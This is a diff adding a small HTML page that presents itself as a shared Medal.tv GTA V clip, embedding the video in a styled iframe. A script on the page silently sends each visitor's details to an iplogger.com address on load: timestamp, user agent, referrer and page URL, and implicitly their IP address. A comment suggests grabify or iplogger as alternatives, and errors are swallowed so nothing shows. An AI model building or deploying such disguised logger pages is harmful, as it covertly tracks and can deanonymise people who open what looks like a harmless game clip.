@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Top Frag | Medal.tv</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%; background: #000;
+      display: flex; justify-content: center; align-items: center;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+    #video-container {
+      width: 90vw;
+      height: 50vw;
+      max-width: 900px;
+      max-height: 500px;
+      box-shadow: 0 0 20px #0ff;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <div id="video-container">
+    <iframe 
+      src="https://medal.tv/games/gta-v/clips/kGre1NKTvDo4D0fK_?invite=cr-MSxQTncsNDE0NzQyNDYx" 
+      width="100%" height="100%" frameborder="0" allowfullscreen
+      sandbox="allow-scripts allow-same-origin allow-presentation">
+    </iframe>
+  </div>
+
+  <script>
+    // IP logger request (replace YOUR_LOGGER_URL with your server or use grabify/iplogger API)
+    fetch('https://iplogger.com/2ut5D6', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        timestamp: Date.now(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        page: window.location.href
+      })
+    }).catch(() => {
+      // Silent fail, low testosterone šchvosti to nerozchodí
+    });
+  </script>
+</body>
+</html>
